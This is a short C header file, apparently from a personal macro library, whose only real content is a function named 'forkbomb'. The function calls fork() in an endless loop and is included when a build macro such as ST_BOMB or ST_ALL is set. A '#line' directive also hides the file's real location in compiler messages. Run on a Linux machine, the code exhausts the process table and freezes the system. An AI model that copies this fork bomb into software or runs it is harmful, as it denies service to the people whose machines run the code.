//forlinux.h
//
#if !defined(STEVE_H_TEST)
	#line 1 "????"
#endif
//
#if defined(ST_BOMB)&&!defined(ST_BOMB_ED)||defined(ST_ALL)
	#define ST_BOMB_ED
	#include<unistd.h>
	#include<sys/types.h>
	nesebg
	_ste void forkbomb()
	{
		usingstd
		for(;;)fork();
	}
	neseed
#endif
#undef ST_BOMB
//
